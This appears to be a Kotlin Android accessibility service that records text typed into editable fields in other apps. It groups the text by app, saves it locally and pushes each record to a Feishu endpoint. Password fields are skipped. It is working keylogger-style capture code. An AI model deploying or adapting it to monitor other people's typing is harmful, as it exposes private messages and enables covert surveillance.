package dev.local.typinglog

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.ComponentCallbacks2
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * 记录“上屏文字”。
 *
 * 输入法把字提交给输入框时，输入框会发出 TYPE_VIEW_TEXT_CHANGED，
 * 事件里带着变化后的完整文本。这里按“应用 + 窗口”聚合，等用户停顿
 * 800ms 或输入框被清空（发送/切换）时，落一条记录。
 *
 * 拿不到的东西：拼音串、候选词、被删掉的中间过程、密码框内容。
 */
class TypingLogService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())

    /** 屏幕熄灭或进程将被回收时，先把待落盘的那一段写掉。 */
    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == Intent.ACTION_SCREEN_OFF) flushAll()
        }
    }

    /** key = 包名 + 窗口 id */
    private val pending = HashMap<String, Pending>()
    private val lastCommitted = HashMap<String, Pair<String, Long>>()
    private val labels = HashMap<String, String>()

    private val prefs: SharedPreferences
        get() = getSharedPreferences(Keys.PREFS, MODE_PRIVATE)

    private inner class Pending(
        val pkg: String,
        var text: String,
        var ts: Long
    ) {
        var task: Runnable? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = serviceInfo?.apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 50
        }
        try {
            registerReceiver(screenReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))
        } catch (_: Exception) {
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!prefs.getBoolean(Keys.ENABLED, true)) {
            pending.clear()
            return
        }
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            handleTextChanged(event)
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val node = event.source ?: return
        try {
            if (event.isPassword || node.isPassword) return
            if (!isEditable(node)) return

            val pkg = event.packageName?.toString() ?: return
            if (pkg == packageName) return

            val text = event.text?.joinToString("") ?: return
            val key = pkg + "#" + event.windowId
            val now = System.currentTimeMillis()

            // 隔了很久才继续输入，先把上一段落下
            val old = pending[key]
            if (old != null && now - old.ts > SESSION_GAP_MS) flush(key)

            if (text.isBlank()) {
                // 输入框被清空：多半是点了发送，马上落盘
                val p = pending.remove(key)
                if (p != null) {
                    p.task?.let { handler.removeCallbacks(it) }
                    if (p.text.isNotBlank()) commit(p.pkg, p.text)
                }
                return
            }

            val p = pending.getOrPut(key) { Pending(pkg, text, now) }
            p.text = text
            p.ts = now
            p.task?.let { handler.removeCallbacks(it) }
            val task = Runnable { flush(key) }
            p.task = task
            handler.postDelayed(task, IDLE_MS)
        } finally {
            node.recycle()
        }
    }

    private fun isEditable(node: AccessibilityNodeInfo): Boolean {
        if (node.isEditable) return true
        val cls = node.className?.toString() ?: return false
        return cls.contains("EditText") || cls.contains("TextInputEditText")
    }

    private fun flush(key: String) {
        val p = pending.remove(key) ?: return
        p.task?.let { handler.removeCallbacks(it) }
        if (p.text.isNotBlank()) commit(p.pkg, p.text)
    }

    private fun flushAll() {
        pending.keys.toList().forEach { flush(it) }
    }

    private fun commit(pkg: String, raw: String) {
        val text = raw.trim()
        if (text.isEmpty()) return

        val now = System.currentTimeMillis()
        val last = lastCommitted[pkg]
        if (last != null && last.first == text && now - last.second < DEDUPE_MS) return
        lastCommitted[pkg] = text to now

        val app = labelOf(pkg)
        val record = Record(now, pkg, app, text)

        // 同步落盘：写完才返回，进程随后被杀也不会丢这一条
        try {
            LogStore.append(this, record)
        } catch (_: Exception) {
        }

        // 推送失败不影响本地记录
        try {
            FeishuPusher.submit(this, record)
        } catch (_: Exception) {
        }
    }

    private fun labelOf(pkg: String): String {
        labels[pkg]?.let { return it }
        val label = try {
            val pm = packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
        } catch (_: Exception) {
            pkg
        }
        labels[pkg] = label
        return label
    }

    override fun onInterrupt() {
        flushAll()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        flushAll()
        super.onTaskRemoved(rootIntent)
    }

    override fun onTrimMemory(level: Int) {
        if (level >= ComponentCallbacks2.TRIM_MEMORY_RUNNING_LOW) flushAll()
        super.onTrimMemory(level)
    }

    override fun onLowMemory() {
        flushAll()
        super.onLowMemory()
    }

    override fun onDestroy() {
        flushAll()
        try {
            unregisterReceiver(screenReceiver)
        } catch (_: Exception) {
        }
        super.onDestroy()
    }

    companion object {
        private const val IDLE_MS = 800L
        private const val SESSION_GAP_MS = 5 * 60 * 1000L
        private const val DEDUPE_MS = 3_000L
    }
}
